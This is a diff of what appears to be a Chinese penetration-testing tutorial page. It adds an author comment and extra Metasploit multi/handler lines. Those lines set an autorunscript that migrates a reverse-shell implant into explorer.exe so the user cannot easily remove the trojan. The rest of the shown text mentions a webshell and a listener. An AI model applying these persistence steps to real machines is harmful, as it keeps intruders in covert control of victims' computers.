@@ -106,6 +106,13 @@
                 
                 
 
+<!--
+ * @Author: reber
+ * @Mail: reber0ask@qq.com
+ * @Date: 2019-04-10 10:45:01
+ * @LastEditTime: 2019-07-15 22:13:29
+ -->
+
 <h3 id="0x00-前提">0x00 前提</h3>
 
 <p>虚拟机有一个shell：<code>http://10.11.11.20/a.php</code>，物理机IP是211.222.222.72<br />
@@ -194,6 +201,9 @@ msf exploit(multi/handler) &gt; set LHOST 0.0.0.0
 LHOST =&gt; 0.0.0.0
 msf exploit(multi/handler) &gt; set LPORT 8888
 LPORT =&gt; 8888
+# autorunscript: 目标上线后执行命令将进程迁移到了资源管理器，防止用户删除木马，然后丢失目标的情况
+msf exploit(multi/handler) &gt; set autorunscript migrate -n explorer.exe
+autorunscript =&gt; migrate -n explorer.exe
 msf exploit(multi/handler) &gt; set ExitOnSession false
 ExitOnSession =&gt; false
 msf exploit(multi/handler) &gt; options
